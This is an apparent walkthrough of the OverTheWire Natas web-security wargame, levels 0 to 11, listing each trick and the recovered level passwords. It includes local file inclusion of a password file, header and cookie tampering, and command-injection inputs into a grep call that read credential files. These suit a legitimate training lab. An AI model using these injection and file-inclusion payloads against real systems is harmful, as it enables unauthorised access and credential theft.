<details open>
<summary>Level 0 - > Level 1</summary>

```
<div id="content"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以在此页面找到下一级的密码。

</font></font><!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
</div>
```

</details>

<details open>
<summary>Level 1 - > Level 2</summary>

```
<div id="content"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以在此页面找到下一级的密码，但右键已被阻止！

</font></font><!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
</div>
```

</details>

<details open>
<summary>Level 2 - > Level 3</summary>

```
<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
该页面上没有任何内容
</font></font>

http://natas2.natas.labs.overthewire.org/files/

# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

</details>

<details open>
<summary>Level 3 - > Level 4</summary>

```
http://natas3.natas.labs.overthewire.org/robots.txt

http://natas3.natas.labs.overthewire.org/s3cr3t/

tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

</details>

<details open>
<summary>Level 4 - > Level 5</summary>

```
Referer: http://natas5.natas.labs.overthewire.org/

<script>
var wechallinfo = { "level": "natas4", "pass": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm" };</script>

Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

</details>

<details open>
<summary>Level 5 - > Level 6</summary>

```
Cookie: __utma=176859643.1977144041.1687720082.1687720082.1687720082.1; __utmc=176859643; __utmz=176859643.1687720082.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); loggedin=1

Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

</details>

<details open>
<summary>Level 6 - > Level 7</summary>

```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

</details>

<details open>
<summary>Level 7 - > Level 8</summary>

```
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```

</details>

<details open>
<summary>Level 8 - > Level 9</summary>

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}

import base64

encoded_secret = "3d3d516343746d4d6d6c315669563362"

# 将十六进制转换为字节串
hex_bytes = bytes.fromhex(encoded_secret)

# 反转字节串
reversed_bytes = hex_bytes[::-1]

# 解码 Base64
decoded_bytes = base64.b64decode(reversed_bytes)

# 将字节串转换为字符串
password = decoded_bytes.decode('utf-8')

print(password)

Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

</details>

<details open>
<summary>Level 9 - > Level 10</summary>

```
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}

a | cat /etc/natas_webpass/natas10 #

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

</details>

<details open>
<summary>Level 10 - > Level 11</summary>

```
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}

. /etc/natas_webpass/natas11

1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

</details>

<details open>
<summary>Level 10 - > Level 11</summary>

```

```

</details>
